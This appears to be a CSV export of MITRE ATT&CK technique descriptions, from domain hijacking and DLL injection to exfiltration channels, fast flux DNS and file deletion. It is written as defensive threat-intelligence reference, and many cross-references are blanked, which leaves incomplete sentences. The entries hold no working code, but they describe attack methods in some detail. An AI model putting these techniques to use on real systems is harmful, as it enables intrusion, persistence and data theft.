Domains,"Before compromising a victim, adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant. An adversary may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.",technique
Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as .  Downgrading of a system image can be done on its own, or it can be used in conjunction with .  ",technique
Drive-by Compromise,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring .Multiple ways of delivering exploit code to a browser exist, including:* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.* Malicious ads are paid for and served through legitimate ad providers.* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.Typical drive-by compromise process:1. A user visits a website that is used to host the adversary controlled content.2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.     * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.3. Upon finding a vulnerable version, exploit code is delivered to the browser.4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike , the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.Adversaries may also use compromised websites to deliver a user to a malicious application designed to s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",technique
Dylib Hijacking,"Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.  If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.",technique
Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by , DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.   Microsoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via  campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a .",technique
Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose of . When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",technique
Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL).  Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary). Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Elevated Execution with Prompt,"Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with  to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.",technique
Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.",technique
Email Accounts,"Before compromising a victim, adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct  or . Adversaries may also take steps to cultivate a persona around the email account, such as through use of , to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: ).To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",technique
Email Accounts,"Before compromising a victim, adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct  or . Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: ).A variety of methods exist for compromising email accounts, such as gathering credentials via , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",technique
Email Addresses,"Before compromising a victim, adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex: ), and/or initial access (ex: ).",technique
Email Collection,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",technique
Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victims organization to use as part of further exploits or operations. Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes. Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.",technique
Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the  configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  service.",technique
Employee Names,"Before compromising a victim, adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex: ), and/or initial access (ex:  or ).",technique
Encrypted Channel,"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",technique
Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.In cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.For attacks attempting to saturate the providing network, see .",technique
Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of  that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses. By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult. These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar to , adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution. By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult. This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like other , environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical . While use of  may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",technique
Establish Accounts,"Before compromising a victim, adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for  or .",technique
Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",technique
Exchange Email Delegate Permissions,"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The Add-MailboxPermission  cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: ), so the messages evade spam/phishing detection mechanisms.",technique
Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of .Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to . Several examples of this weakness in existing common installers have been reported to software vendors.   If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",technique
Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical . While use of  may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",technique
Exfiltration Over Alternative Protocol,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.  can be done using various common operating system utilities such as /SMB or FTP. ",technique
Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",technique
Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",technique
Exfiltration Over C2 Channel,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,technique
Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network",technique
Exfiltration Over Physical Medium,"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",technique
Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",technique
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",technique
Exfiltration Over Web Service,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",technique
Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",technique
Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",technique
Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",technique
Exploit Public-Facing Application,"Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services. Depending on the flaw being exploited this may include . If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies.For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",technique
Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:### Browser-based ExploitationWeb browsers are a common target through  and . Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.### Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through . Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.### Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",technique
Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",technique
Exploitation for Defense Evasion,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for . The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",technique
Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to collect elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.",technique
Exploitation of Remote Services,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through  or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services. Depending on the permissions level of the vulnerable remote service an adversary may achieve  as a result of lateral movement exploitation as well.",technique
Exploits,"Before compromising a victim, adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via  to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. , , , , , , and ).",technique
Exploits,"Before compromising a victim, adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. , , , , , , and ).",technique
External Defacement,"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.  may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as .",technique
External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including , ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",technique
External Remote Services,"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as  can also be used externally.Access to  to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.",technique
Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the processs memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the processs EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Fallback Channels,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,technique
Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",technique
File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native  functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. ",technique
